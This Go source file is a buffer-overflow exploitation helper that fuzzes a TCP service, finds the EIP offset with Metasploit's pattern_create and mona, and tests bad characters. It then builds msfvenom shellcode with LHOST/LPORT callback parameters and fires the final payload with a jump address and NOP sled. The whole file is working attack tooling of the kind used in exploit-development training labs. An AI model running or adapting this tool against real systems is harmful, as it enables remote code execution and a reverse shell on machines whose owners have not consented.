package main

import (
	"bufio"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"path"
	"strconv"
	"strings"
	"time"
)

//Config struct
type Config struct {
	Host    string `json:"host"`
	Port    int    `json:"port"`
	Cmd     string `json:"cmd"`
	MsfPath string `json:"msf-path"`
	Timeout int    `json:"timeout"`
}

//Exploit struct
type Exploit struct {
	Jmp     string `json:"jmp"`
	Offset  int    `json:"off"`
	Payload string `json:"payload"`
}

func saveConfig(s interface{}, filename string) error {
	bytes, err := json.MarshalIndent(s, "", "  ")
	if err != nil {
		return err
	}
	p, _ := os.Getwd()
	return ioutil.WriteFile(path.Join(p, filename), bytes, 0644)
}

func loadConfig(filename string) (interface{}, error) {
	p, _ := os.Getwd()
	bytes, err := ioutil.ReadFile(path.Join(p, filename))
	if err != nil {
		return nil, err
	}
	switch filename {
	case "bof-config.json":
		var c Config
		err = json.Unmarshal(bytes, &c)
		if err != nil {
			return nil, err
		}
		if c.Cmd != "" {
			c.Cmd += " "
		}
		return c, nil
	case "bof-exploit.json":
		var e Exploit
		err = json.Unmarshal(bytes, &e)
		if err != nil {
			return nil, err
		}
		return e, nil
	}
	return nil, nil
}

func fuzz(c Config, t int) int {
	// Payload: cmd + buffer filled with A. Increasing by 100
	fmt.Printf("Fuzzing %s:%d using command: %s and timeout: %d"+"\r\n", c.Host, c.Port, c.Cmd, t)
	count := 100
	for {
		fmt.Println("Sending buffer of size", count, "...")
		err := sendPayload(c, fmt.Sprint(c.Cmd+strings.Repeat("A", count)))
		if err != nil {
			if count == 100 {
				log.Fatal(err)
			}
			return count - 100
		}
		count += 100
		time.Sleep(time.Duration(t) * time.Second)
	}
}

func offset(c Config, n int, v bool) int {
	//Generate Pattern
	fmt.Println("Generating pattern of length", n+400, "...")
	patternCmd := path.Join(c.MsfPath, "tools/exploit/pattern_create.rb")
	pattern, err := exec.Command(patternCmd, "-l", strconv.Itoa(n+400)).Output()
	if err != nil {
		log.Fatal(err)
	}

	//Send payload
	fmt.Printf("Sending payload to %s:%d with command: %s..."+"\n", c.Host, c.Port, c.Cmd)
	err = sendPayload(c, fmt.Sprintf("%s%s", c.Cmd, pattern))
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("Mona command to detect offset:" + "\n")
	fmt.Printf("!mona findmsp -distance %d"+"\n", n+400)

	//Verify
	if v {
		var offset int
		fmt.Print("Enter mona offset:")
		fmt.Scanf("%d", &offset)

		payload := fmt.Sprint(c.Cmd + strings.Repeat("A", offset) + "BBBB")
		fmt.Print("Restart app in immunity debugger and press ENTER to continue...")
		bufio.NewReader(os.Stdin).ReadBytes('\n')
		fmt.Println("Sending payload...")
		err = sendPayload(c, payload)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println("Finding offset was successful if EIP register shows 42424242")
		return offset
	}
	return 0
}

func badchars(c Config, o int, b string, r bool) {
	//Generate badchars payload
	fmt.Println("Generating Payload...")
	badstring := ""
	bad := strings.Split(b, "\\x")

OUTER:
	for i := 0; i < 256; i++ {
		currByte := fmt.Sprintf("%02x", i)
		for _, char := range bad {
			if currByte == char {
				continue OUTER
			}
		}
		badstring += currByte
	}
	decoded, _ := hex.DecodeString(badstring)
	fmt.Println("Bytearray size:", len(decoded))

	//Assemble and send payload
	payload := fmt.Sprint(c.Cmd + strings.Repeat("A", o) + "BBBB" + string(decoded))
	fmt.Printf("Sending payload to %s:%d with command: %s..."+"\n", c.Host, c.Port, c.Cmd)
	err := sendPayload(c, payload)
	if err != nil {
		log.Fatal(err)
	}

	//recurse flag
	if r {
		fmt.Print("Enter detected badchars or q to quit: ")
		fmt.Scanf("%s", &b)
		if b != "q" {
			fmt.Println("Running badchars again")
			badchars(c, o, b, r)
		}

	}

}

func generate(c Config, off int, jmp string, bad string, ptype string, send bool, ip string, port int) {
	//Execute msfvenom
	fmt.Println("Generating msfvenom payload...")
	venomCmd := path.Join(c.MsfPath, "msfvenom")
	//venomArgs := fmt.Sprintf("-p %s LHOST=%s LPORT=%d EXITFUNC=thread -b \"%s\" -f hex -o payload.txt", ptype, ip, port, bad)
	//out, err := exec.Command(venomCmd, venomArgs).Output()
	cmd := exec.Command(venomCmd, "-p", ptype, fmt.Sprint("LHOST="+ip), fmt.Sprintf("LPORT=%d", port), "EXITFUNC=thread", fmt.Sprintf("-b \"%s\"", bad), "-fhex", "-o", "payload.txt")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()
	if err != nil {
		log.Fatal(err)
	}
	//read msfvenom output
	p, _ := os.Getwd()
	payload, err := ioutil.ReadFile(path.Join(p, "payload.txt"))
	if err != nil {
		log.Fatal(err)
	}

	//delete txt file
	fmt.Println("Cleaning...")
	_, err = exec.Command("rm", "payload.txt").Output()
	if err != nil {
		log.Fatal(err)
	}
	//make json
	e := Exploit{Jmp: jmp, Offset: off, Payload: string(payload)}
	err = saveConfig(e, "bof-exploit.json")
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("Exploit config saved to bof-exploit.json. Execute with:\n bof-helper execute -f bof-exploit.json")
	//send if flag set
	if send {
		execute(c, e)
	}
}

func execute(c Config, e Exploit) {
	fmt.Printf("Sending exploit to %s:%d..."+"\n", c.Host, c.Port)
	decoded, _ := hex.DecodeString(e.Payload)
	payload := fmt.Sprint(c.Cmd+strings.Repeat("A", e.Offset)+e.Jmp, strings.Repeat("\x90", 16)+string(decoded))
	err := sendPayload(c, payload)
	if err != nil {
		log.Fatal(err)
	}
}

func sendPayload(conf Config, payload string) error {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", conf.Host, conf.Port))
	if err != nil {
		return err
	}
	conn.SetDeadline(time.Now().Add(time.Duration(conf.Timeout) * time.Second))
	defer conn.Close()

	reply := make([]byte, 1024)
	_, err = conn.Read(reply)
	if err != nil {
		return err
	}

	_, err = fmt.Fprint(conn, payload+"\r\n")
	if err != nil {
		return err
	}

	return nil
}
